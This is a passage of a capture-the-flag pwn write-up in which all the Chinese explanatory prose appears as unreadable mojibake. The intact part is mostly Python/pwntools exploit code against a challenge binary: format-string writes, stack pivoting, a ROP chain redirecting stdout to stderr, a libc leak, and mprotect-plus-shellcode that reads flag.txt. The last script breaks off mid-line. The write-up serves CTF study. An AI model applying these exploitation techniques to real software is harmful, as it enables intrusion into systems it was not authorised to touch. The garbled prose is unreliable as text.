¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆä¸è¿‡åªèƒ½æ‰§è¡Œä¸€æ¬¡ï¼‰</p><p>ç„¶åå¯¹æŠ—æ²™ç®±ä¿æŠ¤ï¼Œé‡‡ç”¨çš„æ–¹å¼æ˜¯orwè¯»å‡ºflagï¼Œä½†æ˜¯close(1)ç»™è¯»å‡ºflagé€ æˆäº†ä¸€äº›å›°æ‰°ï¼Œå¯¹æŠ—æªæ–½æ˜¯å°†stdouté‡å®šå‘åˆ°IO_2_1_stderrè®©ç¨‹åºé‡æ–°å…·æœ‰å›æ˜¾ã€‚</p><h2 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h2><p>ç”±äºæœ‰æ ˆåœ°å€å’Œç¨‹åºåŸºåœ°å€ï¼Œæ‰€ä»¥è¿™é“é¢˜åˆ©ç”¨èµ·æ¥ä¹Ÿä¸éš¾ï¼Œåªè¦å°†stdouté‡å®šå‘ä¸€ä¸‹ï¼Œå†è·å–ä¸€ä¸‹libcåœ°å€ï¼Œæ‰“orwå³å¯ã€‚</p><p>å…ˆè€ƒè™‘å¦‚ä½•æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</p><p>æˆ‘ä»¬æ˜¯çŸ¥é“æ ˆåœ°å€çš„ï¼Œè€Œä¸”readè¯»å…¥äº†0x200çš„æ•°æ®ï¼Œè¿™ä¸ªæ•°æ®é‡å¯ä»¥åšå¾ˆå¤šäº‹æƒ…ï¼Œæ‰€ä»¥è€ƒè™‘ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥å®ç°æ ˆè¿ç§»å»æ‰§è¡Œæˆ‘ä»¬å¸ƒç½®åˆ°æ ˆä¸Šçš„ropé“¾ã€‚</p><p>ropé“¾å…ˆè€ƒè™‘ç”¨magic gadget(<a href="https://www.cnblogs.com/ZIKH26/articles/16193814.html">magic gadgetæˆ‘è¿™ç¯‡æ–‡ç« å…·ä½“ä»‹ç»äº†</a>)å»å°†stdouté‡å®šå‘åˆ°IO_2_1_stderrï¼Œç„¶ååˆ©ç”¨gadgetç‰‡æ®µå»æ‰§è¡Œputså‡½æ•°æ³„éœ²libcåœ°å€(å› ä¸ºæ­¤æ—¶æ ‡å‡†è¾“å‡ºå·²ç»é‡å¯)ï¼Œæ¥ç€ç”¨csuä¸­çš„gadgetç‰‡æ®µæ‰§è¡Œreadå‡½æ•°ï¼Œå†æ¬¡å¸ƒç½®ä¸€æ¡ropé“¾ã€‚</p><p>å…ˆè¯´ç¬¬ä¸€æ¡ropé“¾å§ã€‚</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload=fmtstr_payload(offset=<span class="number">6</span>,writes&#123;rbp_addr:leak_stack_addr+<span class="number">0x118</span>,rbp_addr+<span class="number">8</span>:code_base+<span class="number">0x14D7</span>&#125;,write_size_max=<span class="string">&quot;byte&quot;</span>,write_size=<span class="string">&quot;byte&quot;</span>)</span><br><span class="line">payload+=p64(pop_rbx_rbp)+p64(magic_offset)+p64(stdout+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(magic_addr)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])+p64(code_base+e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x153A</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(leak_stack_addr+<span class="number">0x120</span>)+p64(<span class="number">0x500</span>)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x1520</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå»ºè®®ä½¿ç”¨fmtstr_payloadè¿™ä¸ªæ¨¡å—ï¼Œä¸ç„¶æ‰‹å†™çš„è¯éå¸¸éš¾å—ï¼Œå› ä¸ºä¸€æ¬¡åªèƒ½å†™å…¥0x2000çš„å­—èŠ‚ï¼ˆå› ä¸ºæ ‡å‡†è¾“å‡ºè¢«å…³é—­äº†ï¼Œæ›´æ·±å±‚æ¬¡åŸå› æœªçŸ¥ï¼‰ï¼Œè¿™å°±æ„å‘³ç€ä¸€æ¬¡åªèƒ½æ”¹å†™ä¸€ä¸ªå­—èŠ‚ã€‚æŠŠæ ˆåœ°å€ä¸€å­—èŠ‚ä¸€å­—èŠ‚å†™å…¥çš„è¯ï¼Œè¿˜éœ€è¦è€ƒè™‘æ¯ä¸ªå­—èŠ‚çš„å¤§å°ã€‚å¦‚æœå®ç°çš„è¯å¦‚ä¸‹ï¼ˆä¹Ÿå¯èƒ½è¿˜æœ‰æ›´ç®€å•çš„å®ç°æ–¹æ³•ï¼Œä½†æ˜¯æ¯”èµ›çš„æ—¶å€™æˆ‘è¿™ä¸ªèœèœæ˜¯è¿™ä¹ˆåšçš„ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l1=(start_addr)&amp;<span class="number">0xff</span></span><br><span class="line">l2=(start_addr&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line">m1=(start_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">m2=(start_addr&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span></span><br><span class="line">h1=(start_addr&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xff</span></span><br><span class="line">h2=(start_addr&gt;&gt;<span class="number">40</span>)&amp;<span class="number">0xff</span></span><br><span class="line">dic=&#123;l1:<span class="number">0</span>,l2:<span class="number">1</span>,m1:<span class="number">2</span>,m2:<span class="number">3</span>,h1:<span class="number">4</span>,h2:<span class="number">5</span>&#125;</span><br><span class="line"><span class="built_in">list</span>=[l1,l2,h1,h2,m1,m2]</span><br><span class="line">list_sort=<span class="built_in">sorted</span>(<span class="built_in">list</span>)</span><br><span class="line"><span class="built_in">print</span>(list_sort)</span><br><span class="line"><span class="keyword">if</span> bss_hook&lt;<span class="number">0x2000</span> <span class="keyword">and</span> (list_sort[<span class="number">1</span>]-list_sort[<span class="number">0</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> bss_hook&gt;<span class="number">0x3e8</span> <span class="keyword">and</span> (list_sort[<span class="number">2</span>]-list_sort[<span class="number">1</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">3</span>]-list_sort[<span class="number">2</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">4</span>]-list_sort[<span class="number">3</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">5</span>]-list_sort[<span class="number">4</span>])&gt;<span class="number">9</span>:</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">0</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%16$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">1</span>]-list_sort[<span class="number">0</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%17$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">2</span>]-list_sort[<span class="number">1</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%18$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">3</span>]-list_sort[<span class="number">2</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%19$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">4</span>]-list_sort[<span class="number">3</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%20$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">5</span>]-list_sort[<span class="number">4</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%21$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(bss_hook-list_sort[<span class="number">5</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%284$hna&#x27;</span></span><br><span class="line">payload+=p64(bss_addr+dic[list_sort[<span class="number">0</span>]])+p64(bss_addr+dic[list_sort[<span class="number">1</span>]])+p64(bss_addr+dic[list_sort[<span class="number">2</span>]])</span><br><span class="line">payload+=p64(bss_addr+dic[list_sort[<span class="number">3</span>]])+p64(bss_addr+dic[list_sort[<span class="number">4</span>]])+p64(bss_addr+dic[list_sort[<span class="number">5</span>]])</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿˜æ˜¯å»ºè®®æ¯”èµ›çš„æ—¶å€™ç”¨å·¥å…·(ä½†æ˜¯ä¸èƒ½åªä¼šç”¨å·¥å…·)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload+=p64(pop_rbx_rbp)+p64(magic_offset)+p64(stdout+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(magic_addr)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])+p64(code_base+e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x153A</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(leak_stack_addr+<span class="number">0x120</span>)+p64(<span class="number">0x500</span>)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x1520</span>)</span><br></pre></td></tr></table></figure><p>è¿™éƒ¨åˆ†å°±æ˜¯ä¼ å‚æ‰§è¡Œäº†ä¸€æ¬¡magic gadgetï¼Œä¸€æ¬¡puts,ä¸€æ¬¡readå‡½æ•°ã€‚</p><p>ç„¶åå› ä¸ºè¦æ‰§è¡Œæµè¦è¡”æ¥åˆ°ç¬¬äºŒæ¬¡ropé“¾ä¸Šï¼Œè¿™å°±å¾ˆè€ƒéªŒreadåˆ°åº•æŠŠæ•°æ®ç²¾å‡†å†™åˆ°å“ªã€‚å®Œå…¨å¯ä»¥é€šè¿‡è°ƒè¯•æ¥çœ‹ä¸€ä¸‹æ‰§è¡Œæµæœ€ç»ˆåˆ°äº†å“ªä¸ªæ ˆåœ°å€ï¼Œä¸è¿‡åœ¨è¾“å…¥çš„å­—èŠ‚æ•°å¾ˆå……è£•çš„æƒ…å†µä¸‹å¯ä»¥ç›´æ¥å¸ƒç½®å¾ˆå¤šçš„retæŒ‡ä»¤ï¼Œæ¥å¾€ä¸‹æ»‘ï¼Œæ»‘åˆ°ropé“¾ä¸Šã€‚è¿™æ¬¡çš„ropé“¾é‡‡ç”¨çš„æ˜¯æ‰§è¡Œmprotectå‡½æ•°ï¼Œå°†æ ˆåŒºå˜æˆå¯æ‰§è¡Œçš„ï¼Œç„¶åæ‰“shellcodeè·å–flagã€‚</p><p>ä¸‹é¢æ˜¯ç¬¬äºŒæ¬¡çš„ropé“¾</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p64(code_base+<span class="number">0x1544</span>)*<span class="number">0x30</span></span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(leak_stack_addr&amp;~<span class="number">0xfff</span>)+p64(pop_rsi_addr)+p64(<span class="number">0x500</span>)+p64(pop_rdx_addr)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(mprotect)+p64(leak_stack_addr+<span class="number">0x120</span>+<span class="number">0x1c0</span>)<span class="comment">#è¿™é‡Œè¦å«ä¸€ä¸ªshellcodeçš„åœ°å€ï¼Œç„¶åç”¨retå»æ‰§è¡Œ</span></span><br><span class="line">payload+=asm(shellcraft.cat(<span class="string">&quot;flag.txt&quot;</span>, <span class="number">2</span>))</span><br></pre></td></tr></table></figure><h2 id="å®Œæ•´EXPï¼š"><a href="#å®Œæ•´EXPï¼š" class="headerlink" title="å®Œæ•´EXPï¼š"></a>å®Œæ•´EXPï¼š</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from pwncli import *</span></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> load,log_addr,log,debug</span><br><span class="line"><span class="comment">#p,e,libc=load(&#x27;a&#x27;)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;gift:&#x27;</span>)</span><br><span class="line">leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#log_addr(&#x27;leak_stack_addr&#x27;)</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;username:&#x27;</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;password:&#x27;</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">leak_base_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">code_base=leak_base_addr-<span class="number">0x11a0</span></span><br><span class="line"><span class="comment">#log_addr(&#x27;code_base&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr=code_base+<span class="number">0x1543</span></span><br><span class="line">magic_addr=code_base+<span class="number">0x1272</span></span><br><span class="line">rbp_addr=leak_stack_addr+<span class="number">0x810</span></span><br><span class="line">pop_rbx_rbp=code_base+<span class="number">0x153A</span></span><br><span class="line">stdout=code_base+<span class="number">0x4020</span></span><br><span class="line">magic_offset=libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]-<span class="number">0x1ed6a0</span> +<span class="number">0x1000000000000000</span></span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x153A)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">log(<span class="string">&#x27;leak_stack_addr+0x120&#x27;</span>,<span class="built_in">hex</span>(leak_stack_addr+<span class="number">0x120</span>))</span><br><span class="line">payload=fmtstr_payload(offset=<span class="number">6</span>,writes=&#123;rbp_addr:leak_stack_addr+<span class="number">0x118</span>,rbp_addr+<span class="number">8</span>:code_base+<span class="number">0x14D7</span>&#125;,write_size_max=<span class="string">&quot;byte&quot;</span>,write_size=<span class="string">&quot;byte&quot;</span>)</span><br><span class="line">payload+=p64(pop_rbx_rbp)+p64(magic_offset)+p64(stdout+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(magic_addr)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])+p64(code_base+e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x153A</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(leak_stack_addr+<span class="number">0x120</span>)+p64(<span class="number">0x500</span>)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x1520</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base_addr=read_addr-libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">pop_rsi_addr=libc_base_addr+<span class="number">0x2601f</span></span><br><span class="line">pop_rdx_addr=libc_base_addr+<span class="number">0x142c92</span></span><br><span class="line">mprotect=libc_base_addr+<span class="number">0x1189a0</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">payload=p64(code_base+<span class="number">0x1544</span>)*<span class="number">0x30</span></span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(leak_stack_addr&amp;~<span class="number">0xfff</span>)+p64(pop_rsi_addr)+p64(<span class="number">0x500</span>)+p64(pop_rdx_addr)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(mprotect)+p64(leak_stack_addr+<span class="number">0x120</span>+<span class="number">0x1c0</span>)</span><br><span class="line">payload+=asm(shellcraft.cat(<span class="string">&quot;flag.txt&quot;</span>, <span class="number">2</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ç¬¨æ¯”åœ¨æ¯”èµ›å†™çš„exp"><a href="#ç¬¨æ¯”åœ¨æ¯”èµ›å†™çš„exp" class="headerlink" title="ç¬¨æ¯”åœ¨æ¯”èµ›å†™çš„exp"></a>ç¬¨æ¯”åœ¨æ¯”èµ›å†™çš„exp</h2><p>æˆ‘æœ€å¼€å§‹è€ƒè™‘çš„æ–¹æ³•æ˜¯åŠ«æŒæ ˆé‡Œå­˜æ”¾çš„ä¸€ä¸ªld.soçš„æŒ‡é’ˆï¼Œè¿™ä¸ªæŒ‡é’ˆå¯ä»¥å½±å“åœ¨exitè°ƒç”¨é“¾ä¸Šçš„ä¸€ä¸ªcallï¼Œæ‰€ä»¥åœ¨æ­¤å¤„åŠ«æŒæ‰§è¡Œæµï¼Œç„¶åå†ä¸æ–­ç”¨æ ¼å¼åŒ–å­—ç¬¦å»åŠ«æŒprintfè‡ªå·±çš„è¿”å›åœ°å€ï¼ŒæœŸé—´åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥å®Œæˆstdoutçš„é‡å®šå‘ï¼Œè€Œä¸”è¿™é‡Œè¿˜éœ€è¦çˆ†ç ´ï¼Œç„¶åè¿˜æœ‰ä¸€ä¸ªæ’åºçš„é‚£é‡Œä¸ºäº†ä¿è¯æ˜¯ä¸¤ä¸ªå­—èŠ‚å ä½ä¹Ÿéœ€è¦çˆ†ç ´ï¼ˆä½†æ˜¯èµ›åæˆ‘æƒ³äº†ä¸€ä¸‹ï¼Œå†å¥½å¥½å¤„ç†ä¸€ä¸‹ï¼Œè¿™é‡Œçš„çˆ†ç ´åº”è¯¥å°±èƒ½å…äº†ï¼‰ï¼Œç„¶åé‡å®šå‘ä¹‹åï¼Œæœ€åä¸€æ¬¡payloadé‡Œé¢æ—¢æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä¹Ÿæœ‰ropé“¾ï¼Œæ‰€ä»¥æˆ‘é‡‡ç”¨çš„æ–¹å¼æ˜¯ç”¨csuä¸­çš„ç‰‡æ®µå°†æ ¼å¼åŒ–å­—ç¬¦ä¸²ç»™å¼¹å‡ºå»ï¼Œè‡³æ­¤æ‰§è¡Œæµåˆ°æˆ‘çš„ropé“¾ä¸Šã€‚(è¿™ä¸ªæƒå½“è®°å½•ä¸€ä¸‹å§ï¼Œå› ä¸ºå¤ªéº»çƒ¦(çˆ†ç ´çš„æ¦‚ç‡å¤ªä½ï¼Œå…·ä½“æ¦‚ç‡å¤šå¤§æˆ‘ä¹Ÿæ²¡ç®—ä¸è¿‡åº”è¯¥çˆ†ä¸ªä¸‰å››ç™¾æ¬¡æ‰èƒ½å‡ºä¸€æ¬¡æŠŠ)ï¼Œå‚è€ƒæ„ä¹‰ä¸å¤§)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> email.mime <span class="keyword">import</span> base</span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeat</span>():</span><br><span class="line">    p.sendafter(<span class="string">&#x27;username:&#x27;</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;password:&#x27;</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;gift:&#x27;</span>)</span><br><span class="line">    leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_stack_addr&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;username:&#x27;</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;password:&#x27;</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    leak_base_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    base_addr=leak_base_addr-<span class="number">0x11a0</span></span><br><span class="line">    log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    start_addr=base_addr+<span class="number">0x140B</span><span class="comment">#0x148C</span></span><br><span class="line">    bss_addr=base_addr+<span class="number">0x4048</span></span><br><span class="line">    bss_hook=(bss_addr-<span class="number">0x3d60</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">    l1=(start_addr)&amp;<span class="number">0xff</span></span><br><span class="line">    l2=(start_addr&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    m1=(start_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    m2=(start_addr&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    h1=(start_addr&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    h2=(start_addr&gt;&gt;<span class="number">40</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    <span class="comment"># bss_h=(bss_hook)&amp;0xff</span></span><br><span class="line">    <span class="comment"># bss_l=(bss_hook&gt;&gt;8)&amp;0xff</span></span><br><span class="line">    log_addr(<span class="string">&#x27;m1&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;h1&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;h2&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;l2&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;m2&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;start_addr&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;bss_hook&#x27;</span>)</span><br><span class="line">    dic=&#123;l1:<span class="number">0</span>,l2:<span class="number">1</span>,m1:<span class="number">2</span>,m2:<span class="number">3</span>,h1:<span class="number">4</span>,h2:<span class="number">5</span>&#125;</span><br><span class="line">    <span class="built_in">list</span>=[l1,l2,h1,h2,m1,m2]</span><br><span class="line">    list_sort=<span class="built_in">sorted</span>(<span class="built_in">list</span>)</span><br><span class="line">    <span class="built_in">print</span>(list_sort)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> bss_hook&lt;<span class="number">0x2000</span> <span class="keyword">and</span> (list_sort[<span class="number">1</span>]-list_sort[<span class="number">0</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> bss_hook&gt;<span class="number">0x3e8</span> <span class="keyword">and</span> (list_sort[<span class="number">2</span>]-list_sort[<span class="number">1</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">3</span>]-list_sort[<span class="number">2</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">4</span>]-list_sort[<span class="number">3</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">5</span>]-list_sort[<span class="number">4</span>])&gt;<span class="number">9</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;------&gt;success&lt;------&#x27;</span>)</span><br><span class="line">        payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">0</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%16$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">1</span>]-list_sort[<span class="number">0</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%17$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">2</span>]-list_sort[<span class="number">1</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%18$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">3</span>]-list_sort[<span class="number">2</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%19$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">4</span>]-list_sort[<span class="number">3</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%20$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">5</span>]-list_sort[<span class="number">4</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%21$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(bss_hook-list_sort[<span class="number">5</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%284$hna&#x27;</span></span><br><span class="line">        payload+=p64(bss_addr+dic[list_sort[<span class="number">0</span>]])+p64(bss_addr+dic[list_sort[<span class="number">1</span>]])+p64(bss_addr+dic[list_sort[<span class="number">2</span>]])</span><br><span class="line">        payload+=p64(bss_addr+dic[list_sort[<span class="number">3</span>]])+p64(bss_addr+dic[list_sort[<span class="number">4</span>]])+p64(bss_addr+dic[list_sort[<span class="number">5</span>]])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">&quot;Now, you can&#x27;t see anything!!!&quot;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    </span><br><span class="line">    stdout=base_addr+<span class="number">0x4020</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line">    return_addr=leak_stack_addr-<span class="number">0xf8</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x8C</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%8$hhnaaaaa&#x27;</span>+p64(return_addr)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;aaaaaaaaaaaaaaaa%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x7C</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hhnaaaa&#x27;</span>+p64(return_addr)+p64(stdout)+p64(stdout+<span class="number">1</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,0x14B9,0x146C)</span></span><br><span class="line">    payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x8c</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%11$hhn%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xc0</span>-<span class="number">0x8c</span>).encode(<span 